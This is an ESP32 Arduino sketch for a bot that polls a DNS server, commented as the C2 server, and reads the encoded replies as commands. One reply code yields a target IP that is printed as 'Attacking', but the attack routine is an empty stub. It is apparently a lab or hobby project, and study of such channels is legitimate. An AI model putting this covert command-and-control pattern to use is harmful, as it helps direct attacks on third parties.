#include <WiFi.h>
#include <WiFiUdp.h>
#include "dns.h"

// WiFi credentials.
const char* ssid = "";
const char* password = "";

// DNS server to query.
const IPAddress dnsServer(192, 168, 1, 145); // The C2 Server
const uint16_t dnsPort = 53;


// UDP instance for sending and receiving data.
WiFiUDP udp;

//List of random URLS
// char *urls[] = {"www.shop1.org", "www.info2.net", "www.service3.com", "www.info4.org", "www.portal5.com", "www.info6.io", "www.service7.org", "www.blog8.org", "www.tech9.xyz", "www.service10.xyz", "www.news11.xyz", "www.page12.org", "www.web13.xyz", "www.page14.xyz", "www.site15.com", "www.tech16.io", "www.blog17.net", "www.page18.com", "www.portal19.xyz", "www.site20.org", "www.news21.com", "www.blog22.io", "www.site23.net", "www.portal24.io", "www.service25.io", "www.tech26.net", "www.portal27.net", "www.web28.com", "www.shop29.io", "www.news30.com", "www.page31.io", "www.web32.net", "www.info33.com", "www.shop34.xyz", "www.tech35.org", "www.service36.xyz", "www.blog37.com", "www.news38.io", "www.page39.com", "www.site40.xyz", "www.tech41.com", "www.blog42.org", "www.page43.net", "www.portal44.com", "www.service45.net", "www.tech46.xyz", "www.portal47.com", "www.web48.io", "www.shop49.net", "www.news50.org", "www.page51.com", "www.web52.xyz", "www.info53.net", "www.shop54.com", "www.tech55.net", "www.service56.com", "www.blog57.xyz", "www.news58.net", "www.page59.io", "www.site60.com", "www.tech61.xyz", "www.blog62.com", "www.page63.org", "www.portal64.net", "www.service65.org", "www.tech66.com", "www.portal67.xyz", "www.web68.net", "www.shop69.com", "www.news70.io", "www.page71.net", "www.web72.com", "www.info73.org", "www.shop74.xyz", "www.tech75.com", "www.service76.net", "www.blog77.com", "www.news78.org", "www.page79.xyz", "www.site80.net", "www.tech81.io", "www.blog82.xyz", "www.page83.com", "www.portal84.io", "www.service85.com", "www.tech86.org", "www.portal87.com", "www.web88.xyz", "www.shop89.org", "www.news90.net", "www.page91.com", "www.web92.org", "www.info93.xyz", "www.shop94.net", "www.tech95.com", "www.service96.org", "www.blog97.net", "www.news98.com", "www.page99.xyz", "www.site100.io"};


void setup() {
  Serial.begin(115200);
  // Connect to WiFi.
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");

  


  // Start UDP.
  udp.begin(WiFi.localIP(), dnsPort);

  
}

void loop() {

// Domain to query.
  const char* domain = "example.com";

  // Send DNS query.
  DNSQuery(domain, dnsServer, dnsPort, udp);

  // Listen for a response and handle it.
  int packetSize = udp.parsePacket();
  if (packetSize) {
    Serial.print("Received response: ");
    byte response[512]; // DNS response size could be up to 512 bytes for UDP
    udp.read(response, packetSize); // Read the packet into the buffer
    IPS ips = parseDNSResponse(response, packetSize);
    Serial.println("Values: ");
    Serial.println(ips.arr[0][0]);
    if(ips.arr[0][0] == 2 ){
      IPAddress a(ips.arr[0][1], ips.arr[0][2], ips.arr[0][3], ips.arr[1][0]);
      Serial.print("Attacking: ");
      Serial.println(a);
      // Implement attack code here.....


    }else{
      Serial.println("Awaiting command");
    }

    for(int i = 0; i < IPARRAYSIZE; i++){
      if (ips.arr[i][0] == 1){

      }
    }

    Serial.println();

  }

  delay(1500);
}



